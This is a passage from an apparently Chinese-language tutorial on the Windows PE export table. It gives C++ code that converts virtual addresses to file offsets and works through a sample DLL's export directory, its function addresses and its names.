class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            <span class="keyword">int</span> offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            <span class="keyword">int</span> foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\mydll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic) &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**) <span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span>(cnt&lt; nt-&gt;FileHeader.NumberOfSections)&#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER)*cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关键代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x18FB0</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>由于之前的函数是VA转FOA，这边我们拿到的是RVA,因此想要正确利用，需要用到RVA + ImageBase得到VA</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014201121563.png" alt="image-20211014201121563"></p>
<p>自此拿到FOA为:0x79B0</p>
<h2 id="导出表的结构"><a href="#导出表的结构" class="headerlink" title="导出表的结构"></a>导出表的结构</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>可以定位到导出表后下一步便是要了解导出表的结构，才能解读导出表的信息</p>
<p>C语言中的结构体(Winnt.h可以找到)，本结构在C语言中长40字节，导出表范围:导出表首地址(FOA)+导出表长度-1 (减1是由于导出表首地址也占一个字节)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014203245039.png" alt="image-20211014203245039"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>结构体分析</strong></p>
<table>
<thead>
<tr>
<th>成员</th>
<th>数据宽度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Characteristics</td>
<td>DWORD(4字节)</td>
<td>标志，未用</td>
</tr>
<tr>
<td>TimeDateStamp</td>
<td>DWORD(4字节)</td>
<td>时间戳</td>
</tr>
<tr>
<td>MajorVersion</td>
<td>WORD(2字节)</td>
<td>未用</td>
</tr>
<tr>
<td>MinorVersion</td>
<td>WORD(2字节)</td>
<td>未用</td>
</tr>
<tr>
<td>Name</td>
<td>DWORD(4字节)</td>
<td>指向该导出表的文件名字符串</td>
</tr>
<tr>
<td>Base</td>
<td>DWORD(4字节)</td>
<td>导出函数起始序号</td>
</tr>
<tr>
<td>NumberOfFunctions</td>
<td>DWORD(4字节)</td>
<td>所有导出函数的个数</td>
</tr>
<tr>
<td>NumberOfNames</td>
<td>DWORD(4字节)</td>
<td>以函数名字导出的函数个数</td>
</tr>
<tr>
<td>AddressOfFunctions</td>
<td>DWORD(4字节)</td>
<td>导出函数地址表RVA</td>
</tr>
<tr>
<td>AddressOfNames</td>
<td>DWORD(4字节)</td>
<td>导出函数名称表RVA</td>
</tr>
<tr>
<td>AddressOfNameOrdinals</td>
<td>DWORD(4字节)</td>
<td>导出函数序号表RVA</td>
</tr>
</tbody></table>
<p>解释几个比较重要的字段</p>
<h4 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h4><p>该字段指示的地址指向了一个以”\0”结尾的字符串，字符串记录了导出表所在文件的最初文件名，因此就算后期重命名此PE文件，也可在name处找到最初文件名</p>
<h4 id="Base："><a href="#Base：" class="headerlink" title="Base："></a>Base：</h4><p>该字段指出了导出函数序号的起始值。dll中第一个导出函数的序号并非从0开始，导出函数的编号等于从AddressOfFunction开始的序号加上这个值。大概意思是这样</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014205036689.png" alt="image-20211014205036689"></p>
<p>如图所示，Func1的函数编号为nBase + 0 = 200h， Func2的函数编号为 nbase + 1 = 201h</p>
<h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>该字段定义了文件中导出函数的总个数</p>
<h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>在导出表中，有些函数是定义名字的，有些是没有定义名字的。该字段记录了所有定义名字函数的个数。如果这个值是0，则表示所有的函数都没有定义名字。NumbersOfNames一定小于等于NumbersOfFuctions</p>
<h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>该值为一个指针。该指针指向的位置是一连串的DWORD值，这些值均指向了对应的定义了函数名的函数的字符串地址。这一连串的DWORD值的个数为NumberOfNames</p>
<h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>该指针指向了全部导出函数的入口地址的起始。从入口地址开始为DWORD数组，数组的个数由NumbersOfFuctions决定</p>
<p>导出函数的每一个地址<strong>按函数的编号顺序</strong>依次往后排开。在内存中，可以通过<strong>函数编号</strong>来定位某个函数的地址</p>
<h4 id="AddressOfNameOrdinals"><a href="#AddressOfNameOrdinals" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>该值也是一个指针，与AddressOfNames是<strong>一一对应</strong>关系</p>
<p>不同的是，AddressOfNames指向的是字符串的指针数组，而AddressOfNameOrdinals则指向了该函数在AddressOfFunctions中的<strong>索引值</strong></p>
<hr>
<p>注意：<strong>索引值数据类型为WORD，而非DWORD</strong>。该值与函数编号是两个不同的概念，两者的关系为：</p>
<p>索引值 = 编号 - Base</p>
<h3 id="根据结构分析导出表"><a href="#根据结构分析导出表" class="headerlink" title="根据结构分析导出表"></a>根据结构分析导出表</h3><p>根据之前拿到的导出表FOA + 40 - 1 ，拿到导出表范围，自0x79B0 至0x79D7</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015093614192.png" alt="image-20211015093614192"></p>
<table>
<thead>
<tr>
<th align="center">成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Characteristics</td>
<td>0x00000000</td>
<td>标志，未用</td>
</tr>
<tr>
<td align="center">TimeDateStamp</td>
<td>0xFFFFFFFF</td>
<td>时间戳</td>
</tr>
<tr>
<td align="center">MajorVersion</td>
<td>0x0000</td>
<td>未用</td>
</tr>
<tr>
<td align="center">MinorVersion</td>
<td>0x0000</td>
<td>未用</td>
</tr>
<tr>
<td align="center">Name</td>
<td>0x0001900A</td>
<td>指向该导出表文件名字符串</td>
</tr>
<tr>
<td align="center">Base</td>
<td>0x0000000A</td>
<td>导出函数的起始序号</td>
</tr>
<tr>
<td align="center">NumberOfFunctions</td>
<td>0x00000008</td>
<td>所有导出函数的个数</td>
</tr>
<tr>
<td align="center">NumberOfNames</td>
<td>0x00000003</td>
<td>以函数名字导出的函数个数</td>
</tr>
<tr>
<td align="center">AddressOfFunctions</td>
<td>0x00018FD8</td>
<td>导出函数地址表RVA</td>
</tr>
<tr>
<td align="center">AddressOfNames</td>
<td>0x00018FF8</td>
<td>导出函数名称表RVA</td>
</tr>
<tr>
<td align="center">AddressOfNameOrdinals</td>
<td>0x00019004</td>
<td>导出函数序号表RVA</td>
</tr>
</tbody></table>
<h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>存储的值为指针，该指针为RVA(0x1900A)，同样需要转换成FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1900A</span>,dos,nt,sectionArr); <span class="comment">//0x1900A 为name的rva</span></span><br></pre></td></tr></table></figure>

<p>运行可得</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110233872.png" alt="image-20211015110233872"></p>
<p>利用16进制编辑器得到0x7A0A,拿到Name,PE文件的文件名字符串，以00结尾，MyDll.dll</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015110551475.png" alt="image-20211015110551475"></p>
<h4 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h4><p>导出函数起始序号的RVA 为 0xA , 对应十进制10</p>
<p>回顾之前导出函数的定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>可以看出，此处的base=最小的序号=min{12,15,17,10}=10</p>
<h4 id="NumberOfFunctions-1"><a href="#NumberOfFunctions-1" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数为8</p>
<p>为什么前面声明的导出函数只有4个，但这里显示的却会有八个？</p>
<p>此处的NumberOfFunctions = 最大的序号减去最小的序号 +1 =17-10+1=8</p>
<h4 id="NumberOfNames-1"><a href="#NumberOfNames-1" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>以函数名字导出的函数个数为3，和定义声明中有名称的导出函数数量一致</p>
<h4 id="AddressOfFunctions-1"><a href="#AddressOfFunctions-1" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>存储的值为指针，该指针为RVA(0x18FD8)，同样需要转换为FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FD8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>利用之前的VA转FOA程序修改VaToFoa32代码处数值</p>
<p>运行程序可得AddressOfFunctions处文件偏移为0x79D8,跳转到该地址</p>
<p>根据AddressOfFunctions （DWORD）为数组且数组个数由NumbersOfFuctions决定，本dll文件NumberOfFunctions为8</p>
<p>因此8x4=32（10进制字节数）</p>
<p><strong>拿到每个函数的RVA</strong>.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112733536.png" alt="image-20211015112733536"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015113610137.png" alt="image-20211015113610137"></p>
<p>记录下每个导出函数的地址并转换为RVA为FOA得到</p>
<table>
<thead>
<tr>
<th>Oridinals（索引）</th>
<th>序号(Base+ORIDINALS)</th>
<th>导出函数地址(RVA)</th>
<th>导出函数地址(FOA)</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>10+0 = 10</td>
<td>0x00011320</td>
<td>0x720</td>
</tr>
<tr>
<td>1</td>
<td>10+1=11</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>12</td>
<td>0x00011302</td>
<td>0x702</td>
</tr>
<tr>
<td>3</td>
<td>13</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>14</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>15</td>
<td>0x000111EF</td>
<td>0x5EF</td>
</tr>
<tr>
<td>6</td>
<td>16</td>
<td>0x00000000</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>17</td>
<td>0x000111A4</td>
<td>0x5A4</td>
</tr>
</tbody></table>
<p>可以发现，只有4个函数存在有效地址，跟前方Mydll.dll定义的序号以及数量一致</p>
<h4 id="AddressOfNames-1"><a href="#AddressOfNames-1" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>内部存储着导出函数名称表的RVA</p>
<p>存储的值为指针，该指针为RVA，同样需要转为FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FF8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015115246528.png" alt="image-20211015115246528"></p>
<p>16进制编辑器直接跳转过去</p>
<p>导出函数名称表 = 导出函数名称表单个大小(DWORD) * NumberOfNames值 = 4 * 3 = 12（十进制）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120351876.png" alt="image-20211015120351876"></p>
<p>拿到所有导出函数名称的地址</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00019014</span></span><br><span class="line"><span class="number">0x00019018</span></span><br><span class="line"><span class="number">0x0001901F</span></span><br></pre></td></tr></table></figure>

<p>利用程序将RVA转为OA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19014</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19018</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1901F</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>按照顺序依次拿到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foa 7a14</span><br><span class="line">foa 7a18</span><br><span class="line">foa 7a1f</span><br></pre></td></tr></table></figure>

<p>即得到有名称函数的名称地址为：</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>RVA</th>
<th>FOA</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x19014</td>
<td>0x7A14</td>
</tr>
<tr>
<td>2</td>
<td>0x19018</td>
<td>0x7A18</td>
</tr>
<tr>
<td>3</td>
<td>0x1901F</td>
<td>0x7A1F</td>
</tr>
</tbody></table>
<p>利用FOA与16进制编辑器拿到各自的函数名字符串</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120841885.png" alt="image-20211015120841885"></p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>RVA</th>
<th>FOA</th>
<th>导出函数名称</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x19014</td>
<td>0x7A14</td>
<td>Add</td>
</tr>
<tr>
<td>2</td>
<td>0x19018</td>
<td>0x7A18</td>
<td>Divide</td>
</tr>
<tr>
<td>3</td>
<td>0x1901F</td>
<td>0x7A1F</td>
<td>Multiply</td>
</tr>
</tbody></table>
